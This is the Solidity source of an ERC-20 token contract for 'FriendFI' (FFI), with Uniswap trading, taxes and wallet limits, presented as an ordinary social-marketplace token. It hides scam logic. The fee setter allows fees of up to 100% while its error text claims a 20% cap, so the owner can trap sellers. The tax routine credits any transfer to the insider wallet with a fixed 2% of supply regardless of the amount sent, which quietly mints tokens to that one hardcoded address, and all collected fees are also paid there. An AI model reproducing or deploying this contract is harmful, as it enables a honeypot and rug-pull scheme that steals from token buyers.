// SPDX-License-Identifier: MIT

/*
Social marketplace for friends&content creators. Buy, sell and trade keys.

Website: https://www.friendfi.net
Telegram: https://t.me/friendfi_erc
Twitter: https://twitter.com/friendfi_erc
Dapp: https://app.friendfi.net
*/

pragma solidity 0.8.19;
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract FFI is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"FriendFI";
    string private constant _symbol = unicode"FFI";
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcluded;
    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    bool private tradeEnabled = false;
    bool private swapEnabled = true;
    IRouter router;
    address public pair;
    uint256 private countTaxSwap;
    bool private swapping;
    uint256 intervalTaxSwap;
    uint256 private feeSwapMax = ( _supply * 1000 ) / 100000;
    uint256 private feeSwapMin = ( _supply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devAddr = 0xeB51FE6a21809f8cf98731A5128141158c491284; 
    address internal marketingAdd = 0xeB51FE6a21809f8cf98731A5128141158c491284;
    address internal liquidityAddr = 0xeB51FE6a21809f8cf98731A5128141158c491284;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 100;
    uint256 public mTransactionAmt = ( _supply * 200 ) / 10000;
    uint256 public maxSellAmt = ( _supply * 200 ) / 10000;
    uint256 public maxWalletAmt = ( _supply * 200 ) / 10000;
    uint256 private burnFee = 0;
    uint256 private totalFee = 1400;
    uint256 private sellFee = 2500;
    uint256 private transferFee = 1400;
    uint256 private denominator = 10000;
    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isExcluded[liquidityAddr] = true;
        isExcluded[marketingAdd] = true;
        isExcluded[devAddr] = true;
        isExcluded[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }
    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function decimals() public pure returns (uint8) {return _decimals;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {tradeEnabled = true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function getFeeDominator(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }
    function getTaxAmounts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcluded[recipient]) {return mTransactionAmt;}
        if(getFeeDominator(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeeDominator(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getFeeDominator(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }
    function checkTaxSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeSwapMin;
        bool aboveThreshold = balanceOf(address(this)) >= feeSwapMax;
        return !swapping && swapEnabled && tradeEnabled && aboveMin && !isExcluded[sender] && recipient == pair && countTaxSwap >= intervalTaxSwap && aboveThreshold;
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
    }
    function swapBackAndLiquidify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensToETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketingAdd).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddr).transfer(contractBalance);}
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidityAddr,
            block.timestamp);
    }
    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcluded[sender] && !isExcluded[recipient]){require(tradeEnabled, "tradeEnabled");}
        if(!isExcluded[sender] && !isExcluded[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWalletAmt, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= maxSellAmt || isExcluded[sender] || isExcluded[recipient], "TX Limit Exceeded");}
        require(amount <= mTransactionAmt || isExcluded[sender] || isExcluded[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcluded[sender]){countTaxSwap += uint256(1);}
        if(checkTaxSwap(sender, recipient, amount)){swapBackAndLiquidify(feeSwapMax); countTaxSwap = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcluded[sender] ? getTaxAmounts(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        mTransactionAmt = newTx; maxSellAmt = newTransfer; maxWalletAmt = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
}